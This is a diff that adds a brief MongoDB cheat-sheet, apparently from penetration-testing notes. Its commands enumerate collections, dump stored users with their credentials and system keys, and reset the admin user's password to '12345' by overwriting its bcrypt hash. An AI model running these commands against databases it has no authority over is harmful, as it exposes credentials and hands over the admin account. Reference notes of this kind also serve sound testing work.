@@ -1,1 +1,16 @@
+MongoDB
+mongo "mongodb://localhost:27017"
 
+> use <DATABASE>;
+> show tables;
+> show collections;
+> db.system.keys.find();
+> db.users.find();
+> db.getUsers();
+> db.getUsers({showCredentials: true});
+> db.accounts.find();
+> db.accounts.find().pretty();
+> use admin;
+
+User Password Reset to "12345"
+> db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
